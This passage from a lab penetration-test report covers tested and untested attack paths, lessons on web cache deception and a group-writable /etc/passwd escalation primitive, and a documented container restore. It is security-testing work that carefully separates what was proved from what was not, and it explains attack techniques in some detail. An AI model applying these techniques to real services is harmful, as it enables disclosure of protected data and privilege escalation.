$ grep -c w249canary /etc/passwd
0
```

### 7.5 Checked and *not* defective — recorded so the next worker does not re-chase it

* **`rtk curl -H` header transmission works here.** The brief warns it can silently drop `-H`. Tested in both directions, because a positive-only test cannot detect a drop:

  ```
  POST /api/_debug/cache/flush   with    -H 'X-Dev-Token: lab-dev-flush'  ->  200
  POST /api/_debug/cache/flush   without -H                              ->  401
  plain curl with -H                                                    ->  200
  ```

  The 401 is the control: the endpoint *can* reject a missing header, so the 200s mean the header arrived. This defect did not manifest in this engagement.
* **`curl -b` without `-c`.** Not exercised — I passed tokens explicitly as `Cookie:` headers and captured the body with `-o`, so no cookie-jar round-trip was ever needed. I did not rely on it, which is the only safe response to a known defect.
* **No `nmap -sU`.** Untested, declared as a gap in §1.1, not reported as a closed port.

---

## 8. NOT tested vs discarded with reason

**NOT tested (honest coverage gaps):**

* **UDP.** `nmap -sU` needs root, unavailable on this host. Mitigated by empty `/proc/net/udp{,6}`, a two-process entrypoint, and `ExposedPorts` agreeing with the TCP scan — corroboration, not closure.
* **A forged admin JWT** (`auth.js:12`). Deliberately not exercised, to keep §3.1's chain uncontaminated by a second bug. The finding is filed from source plus the verified-absent env var (§3.6); the *impact* is therefore argued, not demonstrated, and is labelled as such.
* **Real browser execution of the bot's navigation.** I have the server's own `bot.log` line and the resulting cache entry, which is the oracle; I did not drive a headless browser to watch the admin's session make the request.
* **Why busybox drops the euid** (§6.2). The observable is measured and negative; the mechanism is a plausible build-flag guess I did not verify.
* **Post-compromise persistence and exfiltration.** I made no change beyond the writes I reverted, and did not modify anything under `labs/`.
* **Whether a second host exists.** `auto_deploy.sh` declares one container and no extra networks; I did not go looking.

**Discarded with reason (tested or read, then ruled out):**

* **The textbook path-confusion URL** `/account/invoices/1001.pdf/foo.css` — **tested, 404.** `index.js:55` excludes `/account/invoices/` from the SPA fallback and 404s are not stored (`cache.js:149`). §4.4.
* **A non-route URL with a cacheable extension as the attack** — **tested, works, and discloses nothing.** `/totally-made-up.css` is served and cached, and returns the public `index.html`. The entry criterion is satisfied with zero impact; conflating the two would inflate the finding. §4.4.
* **Hash in the `/etc/passwd` field under `UsePAM no`** — tested, `AuthenticationException`, with a working-login control. §6.1(a).
* **`passwd`/`su` to finish the escalation** — tested, both refuse. §6.1(b), §6.1(c).
* **`sed -i` as a write method** — abandoned on measurement once I established the directory-vs-file distinction. §7.3.
* **Reporting "no privilege escalation"** — **rejected.** The group-writable account database *is* an escalation primitive, and I wrote to it and read the write back. What I declined to claim is the root shell I did not get. The two are filed as one finding with two severities, not merged.

---

## 9. What this lab adds to the methodology

1. **Web cache deception, first evidence — and the entry criterion needs a companion question.** The brief's criterion (a *non-route* URL served by the app) is the textbook form, and it is **refuted here**: the classic `/x.pdf/foo.css` 404s. What this lab proves is the broader and more dangerous form — **a genuine dynamic route, carrying a cacheable extension, is cached anyway.** So the criterion needs its second half stated as the primary test: *is the cache's notion of "same resource" coarser than the origin's, and does the response vary by identity?* Ask that first and you find this lab; ask only the route-confusion question and you conclude, correctly but uselessly, that the target is not vulnerable.
2. **Prove the cache stores before you believe any miss — and the control is a public asset.** A `HIT` on a sensitive URL is uninterpretable until a *public* URL has been shown to `MISS`→`HIT` under the same middleware. The static product image was that control, and it costs one request.
3. **The cross-identity comparison is the finding, and it must be in bytes.** Status code and `X-Cache: HIT` are consistent with an origin that simply served the request. The claim that carries weight is an **md5 against the protected artefact measured in-container** — plus the same md5 from three different requesters, which is what demonstrates the identity is *irrelevant* rather than merely absent.
4. **A correct access-control check is not a correct access-control result.** `invoices.js:38` is correct and is still bypassed, because a cache that ignores identity is not constrained by an authorisation check. The control table must therefore distinguish *the check exists and is right* from *the check held*, and only the second is a claim about the system.
5. **The extension list is the vulnerability surface, and it should be read before the first request.** `pdf` being in `CACHEABLE_EXT` (`cache.js:44`) predicted the entire attack. The lab's own comment at `:23-26` names the textbook form; the two *routes* that leak are the ones whose names end in a listed extension. **Enumerate the sensitive routes, take their suffixes, and intersect with the cacheable list** — that intersection is the finding, and it is computable from two files.
6. **`Cache-Control: private, no-store` is a request, not a control.** Both routes set it and both are cached. An origin directive is only honoured by a cache that agrees to honour it, and a cache is a different administrative domain from the origin by definition. **Never treat an origin header as a mitigation**; test the return path, as §3.1 does.
7. **The lab's own description is evidence, and it can over-promise.** All three clauses are *about* real mechanisms, and the third — "escalada de privilegios" — is a real primitive that does not complete. The correct handling is the lab-65 §3.8 one: **file the primitive and the ceiling separately**, name the controls that produced the ceiling, and say plainly that the root shell was not obtained. A description promising escalation that stops at `uid=1001` is a description to correct, not a chain to finish by assertion.
8. **`id` is not `id -u`.** Adding to the execution-identity rule: `id` reports the **real** uid, and a SUID escalation is precisely a divergence between real and effective. Every SUID claim in this corpus must carry `id -u`, and the control that proves the detector works is the *same login succeeding* at the ordinary uid — as §6.1(a) and §6.2 do.
9. **An unsupported predicate that exits 0 is worse than "command not found."** Busybox `find -writable` printed usage, returned nothing, and exited 0 — a false negative that would have deleted this engagement's best finding. Generalises the runbook's rule: **a check that fails loudly is untested; a check that fails quietly while reporting success is worse than untested, because it is indistinguishable from a result.** Every permission enumeration gets a positive control against a file already known to be writable, and stderr is never discarded.
10. **Editing a writable file in an unwritable directory is a *directory* fact, not a *file* fact.** `sed -i` failing on a group-writable `/etc/passwd` looks exactly like the file being read-only. The differential (`>>` works, `sed -i` does not) is the whole diagnosis — and it is the reason the group-write finding survived at all.

---

## 10. Restore

Recreated from the image, not by undoing edits:

```bash
docker rm -f adopting_container
docker run -d --name adopting_container adopting:latest
```

**Verified positively**, not by the absence of an error:

```
IP=172.17.0.5
$ md5sum /etc/passwd
30d8e4ac1e77ef2357d4e3200295579e        <- byte-identical to the pre-test value
$ grep -cE "w249|canary|probe" /etc/passwd
0                                        <- no canaries from any of my probes
$ ls -la /tmp/
total 8                                    <- empty; nothing of mine left
drwxrwxrwt 2 root root 4096 Apr 15 04:51 .
drwxr-xr-x 1 root root 4096 Sep 30 00:10 ..

$ curl -o /dev/null -w '%{http_code}' http://172.17.0.5:2300/api/products
200                                        <- service answering again

$ curl -D - http://172.17.0.5:2300/internal/credentials-report.pdf
HTTP/1.1 403 Forbidden
X-Cache: MISS                              <- cache cold: the disclosure is GONE
```

That last line is the restore's positive control and it is the one that matters: the container is not merely *running*, it is **back to the state where the exploit does not work**. A restore that only proves "HTTP 200 somewhere" would have passed while leaving the cache warm.

I left the image in place (needed for the restore) and removed nothing under `labs/`. Nothing in `/tmp` inside or outside the container is mine to delete beyond confirming it is empty.
